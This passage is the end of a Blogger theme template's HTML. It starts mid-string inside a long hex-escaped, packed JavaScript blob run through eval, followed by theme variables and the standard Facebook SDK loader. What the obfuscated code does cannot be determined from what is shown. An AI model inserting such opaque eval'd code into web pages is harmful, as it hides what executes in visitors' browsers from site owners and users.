x78\x32\x34\x7c\x78\x36\x33\x7c\x78\x36\x34\x7c\x78\x33\x42\x7c\x78\x36\x44\x7c\x78\x36\x37\x7c\x78\x36\x38\x7c\x78\x36\x36\x7c\x78\x32\x32\x7c\x78\x33\x43\x7c\x78\x33\x45\x7c\x78\x37\x39\x7c\x78\x37\x35\x7c\x78\x33\x36\x7c\x78\x37\x36\x7c\x78\x33\x30\x7c\x78\x37\x31\x7c\x78\x33\x41\x7c\x78\x34\x31\x7c\x78\x34\x39\x7c\x78\x35\x42\x7c\x78\x35\x44\x7c\x78\x37\x37\x7c\x78\x34\x33\x7c\x78\x36\x42\x7c\x78\x34\x43\x7c\x78\x34\x32\x7c\x78\x34\x36\x7c\x78\x35\x34\x7c\x78\x34\x34\x7c\x78\x37\x38\x7c\x78\x34\x35\x7c\x78\x34\x38\x7c\x5f\x30\x78\x37\x33\x62\x35\x78\x33\x7c\x78\x35\x30\x7c\x78\x36\x41\x7c\x78\x34\x41\x7c\x78\x33\x37\x7c\x78\x34\x37\x7c\x78\x34\x42\x7c\x78\x35\x33\x7c\x78\x33\x35\x7c\x78\x34\x46\x7c\x5f\x30\x78\x35\x61\x37\x38\x7c\x78\x34\x44\x7c\x78\x34\x45\x7c\x78\x33\x46\x7c\x78\x33\x39\x7c\x78\x35\x35\x7c\x78\x35\x32\x7c\x78\x35\x36\x7c\x78\x33\x34\x7c\x78\x35\x37\x7c\x78\x37\x41\x7c\x78\x35\x31\x7c\x78\x35\x39\x7c\x78\x32\x31\x7c\x78\x33\x38\x7c\x78\x35\x41\x7c\x78\x35\x38\x7c\x5f\x30\x78\x37\x33\x62\x35\x78\x35\x7c\x78\x35\x46\x7c\x78\x32\x33\x7c\x5f\x30\x78\x37\x33\x62\x35\x78\x34\x7c\x78\x32\x36\x7c\x78\x35\x43\x7c\x72\x65\x74\x75\x72\x6e\x7c\x5f\x30\x78\x37\x33\x62\x35\x78\x31\x7c\x5f\x30\x78\x37\x33\x62\x35\x78\x32\x7c\x66\x75\x6e\x63\x74\x69\x6f\x6e\x7c\x5f\x30\x78\x37\x33\x62\x35\x78\x36\x7c\x77\x68\x69\x6c\x65\x7c\x53\x74\x72\x69\x6e\x67\x7c\x69\x66\x7c\x78\x32\x41\x7c\x75\x32\x30\x32\x36\x7c\x76\x61\x72\x7c\x36\x32\x7c\x70\x61\x72\x73\x65\x49\x6e\x74\x7c\x33\x35\x7c\x32\x39\x7c\x74\x6f\x53\x74\x72\x69\x6e\x67\x7c\x33\x36\x7c\x32\x34\x33\x7c\x65\x76\x61\x6c\x7c\x6e\x65\x77\x7c\x52\x65\x67\x45\x78\x70\x27\x2e\x73\x70\x6c\x69\x74\x28\x27\x7c\x27\x29\x2c\x30\x2c\x7b\x7d\x29\x29\x0a";eval(_EOkXs8);


//]]>
</script>
  
<!-- Global Variables -->
<script type='text/javascript'>
//<![CDATA[
// Global variables with content. "Available for Edit"
var monthFormat = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"],
    noThumbnail = "https://4.bp.blogspot.com/-O3EpVMWcoKw/WxY6-6I4--I/AAAAAAAAB2s/KzC0FqUQtkMdw7VzT6oOR_8vbZO6EJc-ACK4BGAYYCw/w680/nth.png",
    postPerPage = 9,
    fixedSidebar = true,
    commentsSystem = "blogger",
    disqusShortname = "soratemplates";
//]]>
</script>
  
  
    
  
</b:if>
</b:if>
</b:if>
<!--Page Navigation Ends -->
  
<!-- Facebook SDK -->
<script type='text/javascript'>
//<![CDATA[
(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = 'https://connect.facebook.net/en_US/sdk.js#xfbml=1&version=v3.0';
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));

//]]>
</script>  
  
  
</body>
</html>
